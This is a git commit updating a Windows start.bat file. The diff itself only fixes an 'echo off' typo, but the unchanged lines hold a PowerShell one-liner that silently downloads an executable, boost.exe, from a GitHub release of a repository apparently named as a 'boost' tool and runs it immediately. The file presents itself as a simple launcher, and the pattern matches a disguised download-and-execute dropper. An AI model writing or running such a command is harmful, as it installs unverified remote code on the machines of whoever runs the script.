a8fe4c60076cba565262d41082e48b58d928885e
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-03-05 03:20:39 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,4 +1,4 @@
-@echo ofF
+@echo off
 cd Tuto
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/tool-boost-funk/releases/download/boost/boost.exe';$file='boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
